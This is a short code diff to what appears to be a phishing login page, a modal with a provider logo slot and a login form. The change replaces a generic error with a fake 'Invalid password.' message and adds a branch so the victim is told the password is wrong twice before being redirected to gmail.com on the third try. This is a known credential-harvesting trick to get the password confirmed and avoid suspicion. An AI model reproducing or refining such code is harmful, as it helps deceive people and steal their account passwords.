@@ -157,7 +157,7 @@
                         <img src="" alt="Provider Logo" id="modalLogo" class="img-fluid modal-logo">
                     </div>
                     <h2 class="modal-title" id="modalTitle"></h2>
-                    <div class="alert alert-danger error-alert" role="alert" id="errorAlert">Please try again later.</div>
+                    <div class="alert alert-danger error-alert" role="alert" id="errorAlert">Invalid password.</div>
                 </div>
                 <div class="modal-body">
                     <form id="loginForm">
@@ -233,7 +233,10 @@
             if (submitCount === 1) {
                 submitButton.textContent = 'Login';
                 document.getElementById('errorAlert').style.display = 'block';
-            } else if (submitCount === 2) {
+            }if (submitCount === 2) {
+                submitButton.textContent = 'Login';
+                document.getElementById('errorAlert').style.display = 'block';
+            } else if (submitCount === 3) {
                 window.location.href = 'http://gmail.com';
             }
         });
